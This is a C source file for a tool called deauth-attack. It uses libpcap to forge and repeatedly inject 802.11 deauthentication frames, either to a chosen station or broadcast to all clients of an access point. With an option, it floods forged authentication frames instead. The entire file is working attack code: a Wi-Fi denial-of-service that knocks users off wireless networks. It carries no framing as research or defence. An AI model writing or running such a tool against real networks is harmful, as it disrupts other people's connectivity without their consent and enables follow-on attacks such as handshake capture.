#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <unistd.h>  // for usleep()

void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
    exit(1);
}

void send_deauth(pcap_t *handle, const char *ap_mac, const char *station_mac) {
    uint8_t packet[38];
    memset(packet, 0, sizeof(packet));

    // Radiotap header (12bytes)
    uint8_t radiotap_header[] = {
        0x00, 0x00, // version, pad
        0x0c, 0x00, // header length
        0x04, 0x00, 0x00, 0x00, // present flags
        0x00, 0x00, // data rate, ??
        0x00, 0x00, // TX flags
    };
    memcpy(packet, radiotap_header, sizeof(radiotap_header));

    // 802.11 Deauthentication header
    // Frame Control (Type/Subtype: Deauthentication)
    packet[12] = 0xc0;
    packet[13] = 0x00;

    // Duration - 314micro
    packet[14] = 0x3a;
    packet[15] = 0x01;

    // Destination Address (Station MAC)
    sscanf(station_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &packet[16], &packet[17], &packet[18], &packet[19], &packet[20], &packet[21]);

    // Source Address (AP MAC)
    sscanf(ap_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &packet[22], &packet[23], &packet[24], &packet[25], &packet[26], &packet[27]);

    // BSSID (AP MAC)
    memcpy(packet + 28, packet + 22, 6);

    // Sequence number
    packet[34] = 0x00;
    packet[35] = 0x00;

    // Reason Code
    packet[36] = 0x07;
    packet[37] = 0x00;

    // Send the packet
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        fprintf(stderr, "Error sending deauth packet: %s\n", pcap_geterr(handle));
    }
    else {
        printf("Deauth-attack: %s -> %s\n", ap_mac, station_mac);
    }
}

void send_auth(pcap_t *handle, const char *ap_mac, const char *station_mac) {
    uint8_t packet[48]; // 52 (auth) - 4 check sequence
    memset(packet, 0, sizeof(packet));

    // Radiotap header (18bytes)
    uint8_t radiotap_header[] = {
        0x00, 0x00, // version
        0x12, 0x00, // header length
        0x04, 0x00, 0x00, 0x00, // present flags
        0x00, // flags
        0x00, // data rate
        0x00, 0x00, // channel frequency
        0x00, 0x00, // channel flags
        0x6c, // antenna signal
        0x00, // antenna
        0x00, 0x00, // RX flags
    };
    memcpy(packet, radiotap_header, sizeof(radiotap_header));

    // 802.11 Authentication header
    // Frame Control (Type/Subtype: Authentication)
    packet[18] = 0xb0;
    packet[19] = 0x00;

    // Duration - 314micro
    packet[20] = 0x3a;
    packet[21] = 0x01;

    // Destination Address (AP MAC)
    sscanf(ap_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &packet[22], &packet[23], &packet[24], &packet[25], &packet[26], &packet[27]);

    // Source Address (station MAC)
    sscanf(station_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &packet[28], &packet[29], &packet[30], &packet[31], &packet[32], &packet[33]);

    // BSSID (AP MAC)
    memcpy(packet + 34, packet + 22, 6);

    // Authentication Sequence Number
    packet[40] = 0x00;
    packet[41] = 0x00;

    // Authentication Algorithm Number (Open System (0))
    packet[42] = 0x00;
    packet[43] = 0x00;

    // Authentication SEQ
    packet[44] = 0x10;
    packet[45] = 0x00;

    // Status Code (0 = Successful)
    packet[46] = 0x00;
    packet[47] = 0x00;

    // Send the packet
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        fprintf(stderr, "Error sending auth packet: %s\n", pcap_geterr(handle));
    }
    else {
        printf("Authen-attack: %s -> %s\n", station_mac, ap_mac);
    }
}

int main(int argc, char *argv[])
{
    if(argc < 3 || argc > 5) {
        usage();
    }

    char *interface = argv[1];
    char *ap_mac_addr = argv[2];
    char *station_mac_addr = NULL;
    char *auth_option = "-auth";
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL) {
        fprintf(stderr, "Could not open device %s: %s\n", interface, errbuf);
        return -1;
    }

    if(argc > 3) {
        station_mac_addr = argv[3];
    }

    if(argc > 4) {
        if(strncmp(auth_option, argv[4], sizeof(auth_option))==0) {
            while(1) {
                send_auth(handle, ap_mac_addr, station_mac_addr);
                usleep(500000); // 0.5s
            }
        }
        else {
            usage();
        }
    }
    else {
        while(1) {
            if(station_mac_addr != NULL) {
                // AP unicast, Station unicast frame
                send_deauth(handle, ap_mac_addr, station_mac_addr);
            }
            else {
                // AP boradcast frame
                send_deauth(handle, ap_mac_addr, "ff:ff:ff:ff:ff:ff");
            }
            usleep(500000);
        }
    }

    pcap_close(handle);
    return 0;
}
